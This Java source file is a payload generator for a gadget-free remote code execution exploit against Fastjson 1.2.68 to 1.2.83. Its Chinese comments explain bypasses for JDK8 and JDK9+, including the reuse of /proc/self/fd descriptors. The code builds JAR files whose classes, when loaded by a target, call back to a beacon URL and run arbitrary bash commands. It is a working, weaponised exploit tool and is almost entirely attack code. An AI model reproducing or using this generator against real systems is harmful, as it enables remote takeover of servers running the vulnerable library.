import org.mockito.asm.AnnotationVisitor;
import org.mockito.asm.ClassWriter;
import org.mockito.asm.MethodVisitor;
import org.mockito.asm.Opcodes;

import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * Fastjson 1.2.68~1.2.83 无 Gadget RCE（checkAutoType 资源探测链）载荷生成器。
 *
 * 关键约束（全部实测踩坑得出）：
 *  1. 内部名必须等于 @type 值 replace('.','/') 的结果，否则 defineClass 报名字不一致。
 *  2. JVM 拒绝含 "//"（空段）、';'、'[' 的类名：
 *     - JDK8      : jar:http://IP:PORT/res!/Cls 可用（单请求 RCE）；
 *     - JDK9+     : 含 "//" 直接 ClassFormatError，必须用 jar:file:/proc/self/fd/N 两段式
 *                   （第一段 jar:http:// 触发真实下载，JDK 会把远端 JAR 缓存成 /tmp/jar_cache*.tmp
 *                    并持有 fd；第二段用单斜杠 jar:file:/proc/self/fd/N!/... 复用该 fd，可过类名校验）。
 *  3. <clinit> 里【绝对不能】引用 JAR 内的第二个类：目标 ClassLoader 的 classpath 里没有它，
 *     解析时 NoClassDefFoundError，静态块当场静默中断。RCE 代码必须全部内联。
 *  4. <clinit> 写成纯直线代码（无跳转、无异常表），任何 JDK 都不要 StackMapTable。
 *
 * 用法:
 *   单类:  java -cp "ysoserial.jar;本目录" GenFJ183 <typeName> <jarOut> <命令> [信标URL]
 *          typeName 例: jar:http:..3232251513:8000.fjprobe!.foo.P1
 *          （replace('.','/') 后 = jar:http://3232251513:8000/fdprobe!/foo/P1）
 *   fd枚举: java -cp "ysoserial.jar;本目录" GenFJ183 <typeName模板> <jarOut> <命令> <信标URL> --fd=3-256
 *          模板里用 %d 表示 fd 号，例: jar:file:.proc.self.fd.%d!.f%d
 *          每个生成一个入口 + 一个独立内部名（内部名含 fd 号，必须一一对应）。
 */
public class GenFJ183 {
    public static void main(String[] a) throws Exception {
        if (a.length < 3) {
            System.out.println("usage: GenFJ183 <typeName|template> <jarOut> <bash-cmd> [beaconUrl] [--fd=3-256|3,7,18-20]");
            System.exit(2);
        }
        String typeName = a[0];
        String jarPath = a[1];
        String cmd = a[2];
        String beacon = (a.length > 3) ? a[3] : "";
        String fdSpec = null;
        List<String> extras = new ArrayList<String>();
        for (String s : a) {
            if (s.startsWith("--fd=")) fdSpec = s.substring(5);
            else if (s.startsWith("--also=")) extras.add(s.substring(7));
        }

        List<int[]> ranges = null;
        if (fdSpec != null) {
            ranges = new ArrayList<int[]>();
            for (String part : fdSpec.split(",")) {
                part = part.trim();
                if (part.isEmpty()) continue;
                int dash = part.indexOf('-');
                if (dash > 0) {
                    ranges.add(new int[]{Integer.parseInt(part.substring(0, dash)),
                                         Integer.parseInt(part.substring(dash + 1))});
                } else {
                    int v = Integer.parseInt(part);
                    ranges.add(new int[]{v, v});
                }
            }
        }

        List<String[]> items = new ArrayList<String[]>();   // [internal, entry]
        if (ranges == null) {
            String internal = typeName.replace('.', '/');
            items.add(new String[]{internal, entryOf(typeName, internal)});
        } else {
            if (typeName.indexOf("%d") < 0) {
                System.out.println("[!] --fd 模式要求 typeName 模板里包含 %d");
                System.exit(2);
            }
            for (int[] r : ranges) {
                for (int n = r[0]; n <= r[1]; n++) {
                    String t = typeName.replace("%d", String.valueOf(n));
                    String internal = t.replace('.', '/');
                    items.add(new String[]{internal, entryOf(t, internal)});
                }
            }
        }
        // 额外的类（例如同一 JAR 里再放一个 jar:http:// 形态的类，供 JDK8 单请求用）
        for (String ex : extras) {
            String internal = ex.replace('.', '/');
            items.add(new String[]{internal, entryOf(ex, internal)});
        }
        if (items.isEmpty()) {
            System.out.println("[!] 没有生成任何类");
            System.exit(2);
        }

        JarOutputStream jo = new JarOutputStream(new FileOutputStream(jarPath));
        for (String[] it : items) {
            byte[] code = genClass(it[0], beacon, cmd);
            String entry = it[1];
            if (entry.isEmpty()) {
                System.out.println("[!] 入口名为空: " + it[0]);
                System.exit(2);
            }
            jo.putNextEntry(new JarEntry(entry + ".class"));
            jo.write(code);
            jo.closeEntry();
        }
        jo.close();
        System.out.println("JAR_OK " + jarPath + " entries=" + items.size()
                + " first=" + items.get(0)[1] + ".class"
                + " internal=" + items.get(0)[0]
                + " beacon=" + (beacon.length() > 0 ? "yes" : "no")
                + " cmd=" + (cmd.length() > 0 ? "yes" : "no"));
    }

    /** @type 值里 '!' 之后的部分就是 JAR 入口路径（'.' -> '/'） */
    static String entryOf(String typeName, String internal) {
        int bang = typeName.indexOf('!');
        String e;
        if (bang >= 0) {
            e = typeName.substring(bang + 1);
            if (e.startsWith(".")) e = e.substring(1);
            e = e.replace('.', '/');
        } else {
            // 本地自测模式：入口名 = 类名最后一段
            e = internal.substring(internal.lastIndexOf('/') + 1);
        }
        if (e.indexOf('!') >= 0 || e.indexOf(';') >= 0 || e.indexOf('[') >= 0
                || e.contains("//")) {
            return "";
        }
        return e;
    }

    static byte[] genClass(String internal, String beacon, String cmd) {
        ClassWriter cw = new ClassWriter(0);
        cw.visit(Opcodes.V1_6, Opcodes.ACC_PUBLIC + Opcodes.ACC_SUPER,
                 internal, null, "java/lang/Object", null);
        // @JSONType 注解：checkAutoType 的资源探测读到它才会放行 loadClass 并跳过类型匹配检查
        AnnotationVisitor av = cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        av.visitEnd();

        // 无参构造（fastjson 实例化需要）
        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V");
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(1, 1);
        mv.visitEnd();

        // static { 信标; Runtime.exec(new String[]{"/bin/bash","-c",cmd}); }
        mv = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();
        if (beacon != null && beacon.length() > 0) {
            mv.visitTypeInsn(Opcodes.NEW, "java/net/URL");
            mv.visitInsn(Opcodes.DUP);
            mv.visitLdcInsn(beacon);
            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V");
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/URL", "openStream", "()Ljava/io/InputStream;");
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "close", "()V");
        }
        if (cmd != null && cmd.length() > 0) {
            mv.visitInsn(Opcodes.ICONST_3);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
            mv.visitInsn(Opcodes.DUP);
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitLdcInsn("/bin/bash");
            mv.visitInsn(Opcodes.AASTORE);
            mv.visitInsn(Opcodes.DUP);
            mv.visitInsn(Opcodes.ICONST_1);
            mv.visitLdcInsn("-c");
            mv.visitInsn(Opcodes.AASTORE);
            mv.visitInsn(Opcodes.DUP);
            mv.visitInsn(Opcodes.ICONST_2);
            mv.visitLdcInsn(cmd);
            mv.visitInsn(Opcodes.AASTORE);
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;");
            mv.visitInsn(Opcodes.SWAP);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                               "([Ljava/lang/String;)Ljava/lang/Process;");
            mv.visitInsn(Opcodes.POP);
        }
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(6, 0);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }
}
